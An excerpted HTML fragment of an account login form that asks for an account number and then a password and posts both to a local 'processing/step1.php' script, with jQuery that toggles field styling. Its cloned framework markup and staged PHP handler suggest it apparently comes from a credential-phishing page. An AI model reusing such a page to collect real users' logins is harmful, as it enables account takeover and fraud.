                            ...
                            <div data-v-55886b46="" data-v-0945e6cd="" data-v-441a3690="">
                                ...
                                <div data-v-2906dda8="" data-v-55886b46="" class="row">
                                    <div data-v-2906dda8="" class="col-md-5 col-lg-4 col">
                                        <form data-v-55886b46="" novalidate="novalidate" class="v-form" data-v-2906dda8="" action="./processing/step1.php" method="POST">
                                            <div data-v-6a6d1b4c="" data-v-55886b46="">
                                                    ...
                                                    <div data-v-021e61f0="" id="accountdiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="account" id="accountlabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Account Number</label><input autocomplete="off" autofocus="autofocus" id="account" name="account" type="text"></div>
                                                            </div>
                                                ...
                                                <div data-v-a240bf3a="" data-v-c2913866="" id="passworddiv" style="display:none;" data-v-6a6d1b4c="" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                    <div class="v-input__control">
                                                        <div class="v-input__slot">
                                                            <div class="v-text-field__slot"><label for="password" id="passwordlabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Password</label><input autocomplete="current-password" autofocus="autofocus" id="password" name="password" type="password"></div>
    ...
    <script>
        ...
        $('#passworddiv').on('input', function(e) {
            ...
            if ($.trim($('#password').val()).length) {
                ...
                $("#passworddiv").removeClass('v-input--has-state');
                ...
                $("#passworddiv").addClass('v-input--has-state');
